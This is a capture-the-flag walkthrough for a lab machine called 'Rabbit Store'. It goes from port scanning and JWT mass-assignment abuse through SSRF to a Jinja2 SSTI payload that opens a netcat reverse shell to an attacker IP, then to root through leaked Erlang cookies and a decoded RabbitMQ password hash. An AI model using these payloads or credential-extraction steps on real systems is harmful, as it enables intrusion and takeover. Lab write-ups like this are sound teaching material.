# Rabbit Store





## Port Scanning

```bash
nmap -T4 -A -p 22,80,4369,25672 --min-rate 1000 10.10.11.161 -oN port_scan.txt -Pn

Nmap scan report for 10.10.11.161
Host is up (0.037s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://cloudsite.thm/
|_http-server-header: Apache/2.4.52 (Ubuntu)
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



## Web Enumeration

### Creation of a privilege account abuse.

The login botton link in a subdomain with a login page.

<figure><img src="../../../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

We can make a Sign In but our account won't be able to do anything.

<figure><img src="../../../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

If we analyse the request with Burp Proxy, we can get the field inserts to the JWT token, the allow us or not to make access to other actions in the site.

<figure><img src="../../../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

Trying to register another account with Burp Suite Repeater and add the filed `subscription`.

<figure><img src="../../../.gitbook/assets/image (303).png" alt="" width="375"><figcaption></figcaption></figure>

In this way when we created the new user, the backend will not set the default value for subscrition but will set the value that we pass in the request.

Now we able to make actions in the site.

<figure><img src="../../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>



### API Fuzzing

{% code overflow="wrap" %}
```bash
wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt --hc 404 'http://storage.cloudsite.thm/api/FUZZ'

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000025:   405        0 L      4 W        36 Ch       "register"                                                                                                                                                                 
000000009:   405        0 L      4 W        36 Ch       "login"                                                                                                                                                                    
000000123:   403        0 L      2 W        27 Ch       "docs"                                                                                                                                                                     
000000112:   401        0 L      3 W        32 Ch       "uploads" 
```
{% endcode %}



## File Upload&#x20;

If we can't execute a reverse shell via file upload, we need another approach. Notably, the URL file upload mechanism demands a URL for execution. We can leverage an SSRF vulnerability to access the `/api/docs` file, which may reveal API documentation and available routes for further exploration.

Upload a file from URL with this payload:

```
"url":"http://localhost:3000/api/docs"
```

<figure><img src="../../../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

We have created the file. Now copy the UUID of the file created and get the content of the file.

<figure><img src="../../../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

The `/api/fetch_messeges_from_chatbot` is a new route. Now try to understant it.

First things first, run the request with a random json (empty json or another request's json)

<figure><img src="../../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>



### SSTI vulnerability - Jinja2

Test for SSTI vulnerability.

<figure><img src="../../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

The web site is vulnerable to SSFI.

Try to upload a payload to execute an arbitrary command.

<figure><img src="../../../.gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>



Spawn a reverse shell with this payload

{% code overflow="wrap" %}
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.23.52.142 9009 >/tmp/f').read() }}
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

Now we can print the user flag

```bash
cat /home/azrael/user.txt
```

## Privilege Escalation

### PrivEsc with RabbitMQ service&#x20;

After enumerating the machine with Linpeas, we saw the there is rabbitmq services running on port 4369:

```bash
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
```

RabbitMQ service is a dependable messaging and streaming service.

To authenticate to a rabbitmq node we need the Earlang Cookie.&#x20;

{% code title="Linpeas output" %}
```bash
╔══════════╣ Analyzing Erlang Files (limit 70)
-r-------- 1 azrael azrael 20 Jul 23 00:00 /home/azrael/.erlang.cookie                                              
CJFEPAZSYRYJDGEEHKSE
-r-----r-- 1 rabbitmq rabbitmq 16 Jul 23 19:06 /var/lib/rabbitmq/.erlang.cookie
yQKqGS5hcuvz0jIi

```
{% endcode %}

With this cookie we have the rights to access and management the rabbit node.

Viewing the DNS config we can find out now domain to add in out /etc/hosts file.&#x20;

```
127.0.0.1 localhost
127.0.1.1 forge <--
127.0.0.1 cloudsite.thm
127.0.0.1 storage.cloudsite.thm
```

Now we can connect to Erlang node with cookies obtained from our attacker machine and try to list all user.

{% code overflow="wrap" %}
```bash
sudo rabbitmqctl --node rabbit@forge --erlang-cookie "yQKqGS5hcuvz0jIi" list_users

user    tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.     []
root    [administrator]

```
{% endcode %}

Now try to extract the configuration file with this command:

{% code overflow="wrap" %}
```bash
sudo rabbitmqctl --erlang-cookie 'yQKqGS5hcuvz0jIi' --node rabbit@forge export_definitions /tmp/conf.json
```
{% endcode %}

```bash
cat /tmp/conf.json | jq

[..snip..]
{
      "hashing_algorithm": "rabbit_password_hashing_sha256",
      "limits": {},
      "name": "root",
      "password_hash": "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
      "tags": [
        "administrator"
      ]
    }
[..snip..]
```

Reading the following part of the documentation we can decrypt the passowrd\_hash.

{% embed url="https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm" %}

&#x20;With this command we can revert the hash:

{% code overflow="wrap" %}
```bash
echo "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF" | base64 -d | xxd -p -c 100 | cut -c9-

295d1d1...811ed194f98073585

# xxd: is a HEX dumper
# -p: plain hexdump (extract hex chars from binary)
# -c 100: extend the output chars per line 

# cut -c9-: This trims the first 8 characters from each line of the hex output
```
{% endcode %}

Now with the password, we can make access as `root` user.

```bash
su root
Password: 295d1d1...811ed194f98073585
```

Let's print the root flag.

```bash
cat /root/root.txt
```
